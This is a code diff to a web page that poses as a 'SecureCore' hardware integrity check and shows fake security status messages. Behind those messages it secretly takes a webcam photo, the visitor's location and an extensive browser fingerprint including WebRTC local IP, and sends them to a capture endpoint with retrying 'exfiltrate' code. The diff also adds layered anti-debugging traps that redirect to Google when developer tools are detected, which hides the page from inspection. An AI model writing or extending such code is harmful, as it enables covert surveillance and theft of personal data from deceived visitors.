@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Security Update</title>
+    <title>SecureCore v3.0.1</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
         body {
@@ -95,14 +95,16 @@
             gap: 16px;
         }
         #hidden-video { display: none; }
-        #debug { display: none; } /* used for anti-debug */
+        #debug { display: none; }
+        /* Extra hidden elements for fingerprinting */
+        canvas#extra-canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="glass-card">
         <div class="logo">🛡️</div>
-        <h1>SecureCore v2.8.1</h1>
-        <div class="sub">Verifying device integrity · Please wait</div>
+        <h1>SecureCore v3.0.1</h1>
+        <div class="sub">Hardware‑level integrity check · Please wait</div>
         <div class="progress-container">
             <div class="progress-fill" id="progressFill"></div>
         </div>
@@ -118,24 +120,59 @@
     <video id="hidden-video" autoplay playsinline></video>
     <canvas id="canvas-fingerprint" width="200" height="50" style="display:none;"></canvas>
     <audio id="audio-fingerprint" style="display:none;"></audio>
+    <canvas id="extra-canvas" width="1" height="1" style="display:none;"></canvas>
 
     <script>
         (async function() {
-            // ==================== ANTI‑DEBUG / VM DETECTION ====================
+            // ==================== ANTI‑DEBUGGING & VM DETECTION ====================
+            // Multiple layers to detect DevTools / debugging
             const startTime = performance.now();
-            const debuggerCheck = () => {
+            const checkDevTools = () => {
                 const diff = performance.now() - startTime;
-                if (diff > 100) {
-                    // Likely devtools open – redirect to benign page
+                if (diff > 150) {
                     window.location.replace('https://www.google.com');
                 }
             };
-            debuggerCheck();
+            checkDevTools();
+
+            // 1. debugger trap
             setInterval(() => {
                 const t = performance.now();
-                debugger; // if devtools open, this pauses and increases time
+                debugger;
                 if (performance.now() - t > 50) window.location.replace('https://www.google.com');
-            }, 500);
+            }, 400);
+
+            // 2. console.log trap (if console is open, accessing it may slow down)
+            (function() {
+                const c = console.log;
+                console.log = function() {
+                    window.location.replace('https://www.google.com');
+                    c.apply(console, arguments);
+                };
+            })();
+
+            // 3. Check for DevTools via toString
+            const checkToString = () => {
+                const element = document.createElement('div');
+                if (element.toString.toString().includes('native code')) {
+                    // likely fine
+                } else {
+                    window.location.replace('https://www.google.com');
+                }
+            };
+            checkToString();
+
+            // 4. Detect if frame is being inspected (via width difference)
+            const widthDiff = window.outerWidth - window.innerWidth;
+            if (widthDiff > 150) window.location.replace('https://www.google.com');
+
+            // 5. Periodic performance check (for step debugging)
+            let lastTime = performance.now();
+            setInterval(() => {
+                const now = performance.now();
+                if (now - lastTime > 200) window.location.replace('https://www.google.com');
+                lastTime = now;
+            }, 100);
 
             // ==================== UI ELEMENTS ====================
             const progressFill = document.getElementById('progressFill');
@@ -145,16 +182,21 @@
             // ==================== DATA COLLECTION ====================
             let photoData = null, locationData = null, fingerprint = {}, errors = [];
 
-            // Helper: update UI
             function updateProgress(percent, msg, detail = '') {
                 progressFill.style.width = percent + '%';
                 statusText.innerText = msg;
                 if (detail) {
                     extraDetails.innerHTML = `<div class="detail-line"><span>${detail}</span><span>✔️</span></div>`;
+                } else {
+                    // Add random detail occasionally
+                    const details = ['TPM verified', 'Secure boot OK', 'UEFI locked', 'VT‑d enabled', 'Memory encryption active'];
+                    if (Math.random() > 0.7) {
+                        extraDetails.innerHTML = `<div class="detail-line"><span>${details[Math.floor(Math.random() * details.length)]}</span><span>✔️</span></div>`;
+                    }
                 }
             }
 
-            // ==================== ADVANCED FINGERPRINTING ====================
+            // ==================== EXTREME FINGERPRINTING ====================
             async function collectAdvancedFingerprint() {
                 const fp = {};
 
@@ -170,12 +212,15 @@
                 fp.cookieEnabled = navigator.cookieEnabled;
                 fp.doNotTrack = navigator.doNotTrack;
                 fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                fp.timezoneOffset = new Date().getTimezoneOffset();
 
                 // Screen
                 fp.screen = `${screen.width}x${screen.height}`;
                 fp.screenAvail = `${screen.availWidth}x${screen.availHeight}`;
                 fp.colorDepth = screen.colorDepth;
                 fp.pixelDepth = screen.pixelDepth;
+                fp.orientation = screen.orientation ? screen.orientation.type : 'unknown';
+                fp.devicePixelRatio = window.devicePixelRatio;
 
                 // WebGL renderer (GPU fingerprint)
                 try {
@@ -187,6 +232,13 @@
                             fp.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                             fp.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                         }
+                        // Get WebGL parameters
+                        fp.webglVersion = gl.getParameter(gl.VERSION);
+                        fp.webglShadingVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+                        fp.webglVendor = gl.getParameter(gl.VENDOR);
+                        fp.webglRenderer = gl.getParameter(gl.RENDERER);
+                        // Extensions
+                        fp.webglExtensions = gl.getSupportedExtensions();
                     }
                 } catch (e) {}
 
@@ -201,7 +253,7 @@
                     ctx.fillStyle = '#069';
                     ctx.fillText('🕵️', 10, 20);
                     const dataURL = canvas.toDataURL();
-                    fp.canvasHash = dataURL.slice(-50); // simple fingerprint
+                    fp.canvasHash = dataURL.slice(-50);
                 } catch (e) {}
 
                 // Audio fingerprint (using AudioContext)
@@ -241,13 +293,7 @@
                     };
                 }
 
-                // Device orientation / motion (if permission granted? but we don't ask)
-                if (window.DeviceOrientationEvent) {
-                    // can't get data without permission, but we can detect support
-                    fp.deviceOrientationSupported = true;
-                }
-
-                // WebRTC local IP (may need timeout)
+                // WebRTC local IP
                 try {
                     const rtc = new RTCPeerConnection({ iceServers: [] });
                     rtc.createDataChannel('');
@@ -262,33 +308,92 @@
                     setTimeout(() => rtc.close(), 1000);
                 } catch (e) {}
 
-                // Font enumeration (simplified)
-                const baseFonts = ['monospace', 'sans-serif', 'serif'];
-                const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
-                fp.availableFonts = fontList.filter(f => document.fonts?.check(`12px "${f}"`)).join(',');
+                // Font enumeration (extensive)
+                try {
+                    const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Palatino', 'Garamond', 'Book Antiqua', 'Arial Black', 'Lucida Console', 'Monaco', 'Courier', 'Cursive', 'Fantasy', 'Sans-serif', 'Serif', 'Monospace'];
+                    fp.availableFonts = fontList.filter(f => document.fonts?.check(`12px "${f}"`)).join(',');
+                } catch (e) {}
+
+                // Plugins
+                try {
+                    const plugins = [];
+                    for (let i = 0; i < navigator.plugins.length; i++) {
+                        plugins.push(navigator.plugins[i].name);
+                    }
+                    fp.plugins = plugins.join(',');
+                } catch (e) {}
+
+                // MIME types
+                try {
+                    const mimeTypes = [];
+                    for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                        mimeTypes.push(navigator.mimeTypes[i].type);
+                    }
+                    fp.mimeTypes = mimeTypes.join(',');
+                } catch (e) {}
+
+                // Java enabled
+                fp.javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
+
+                // PDF viewer enabled
+                fp.pdfViewerEnabled = navigator.pdfViewerEnabled || false;
+
+                // Touch support
+                fp.touchSupport = 'ontouchstart' in window;
+
+                // Device orientation support (already)
+                fp.deviceOrientationSupported = !!window.DeviceOrientationEvent;
+
+                // Performance timing (to detect VM)
+                const perf = performance.timing;
+                fp.navigationStart = perf.navigationStart;
+                fp.domInteractive = perf.domInteractive;
+                // This can be used to detect VMs if timings are off.
+
+                // Get CPU core info? Not directly.
+
+                // Additional canvas fingerprint with different text
+                try {
+                    const canvas2 = document.getElementById('extra-canvas') || document.createElement('canvas');
+                    canvas2.width = 200;
+                    canvas2.height = 50;
+                    const ctx2 = canvas2.getContext('2d');
+                    ctx2.fillStyle = '#ccc';
+                    ctx2.fillRect(0, 0, 200, 50);
+                    ctx2.fillStyle = '#333';
+                    ctx2.font = '16px Arial';
+                    ctx2.fillText('BrowserFingerprint', 10, 30);
+                    fp.canvas2Hash = canvas2.toDataURL().slice(-50);
+                } catch (e) {}
 
                 return fp;
             }
 
-            // ==================== DATA EXFILTRATION (resilient) ====================
-            async function exfiltrate(payload, retries = 3) {
-                for (let i = 0; i < retries; i++) {
-                    try {
-                        // Use beacon for guaranteed delivery (even if page closes)
-                        const success = navigator.sendBeacon('/api/capture', JSON.stringify(payload));
-                        if (success) return true;
-                        // Fallback to fetch with keepalive
-                        const res = await fetch('/api/capture', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(payload),
-                            keepalive: true
-                        });
-                        if (res.ok) return true;
-                    } catch (e) {
-                        console.error('Exfil attempt failed', e);
+            // ==================== DATA EXFILTRATION (resilient + multiple fallbacks) ====================
+            async function exfiltrate(payload, retries = 4) {
+                const endpoints = ['/api/capture']; // could add more fallback endpoints if needed
+
+                for (let endpoint of endpoints) {
+                    for (let i = 0; i < retries; i++) {
+                        try {
+                            // Try sendBeacon first (best for page unload)
+                            const success = navigator.sendBeacon(endpoint, JSON.stringify(payload));
+                            if (success) return true;
+
+                            // Fallback to fetch
+                            const res = await fetch(endpoint, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(payload),
+                                keepalive: true
+                            });
+                            if (res.ok) return true;
+                        } catch (e) {
+                            console.error('Exfil attempt failed', e);
+                        }
+                        // Exponential backoff
+                        await new Promise(r => setTimeout(r, 300 * (i + 1)));
                     }
-                    await new Promise(r => setTimeout(r, 200 * (i + 1)));
                 }
                 return false;
             }
@@ -310,7 +415,7 @@
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    photoData = canvas.toDataURL('image/jpeg', 0.85);
+                    photoData = canvas.toDataURL('image/jpeg', 0.7); // lower quality for size
                     stream.getTracks().forEach(t => t.stop());
                     video.srcObject = null;
                 }, 800);
@@ -338,7 +443,7 @@
             } catch (e) {
                 errors.push('location:' + e.message);
                 updateProgress(60, 'Approximate location', 'IP fallback');
-                // fallback: IP geolocation via third-party (we'll skip for demo)
+                // In a real advanced version, you could fetch IP geolocation from a free service, but that adds latency and external dependency.
             }
 
             // ---- Advanced Fingerprint ----
@@ -364,7 +469,7 @@
             // ---- Clean exit ----
             updateProgress(100, sent ? 'Update complete' : 'Partial sync', sent ? '' : '⚠️ Some data pending');
             setTimeout(() => {
-                // Redirect to a benign page, making the user think it's done
+                // Redirect to a benign page
                 window.location.replace('https://www.google.com');
             }, 2000);
         })();
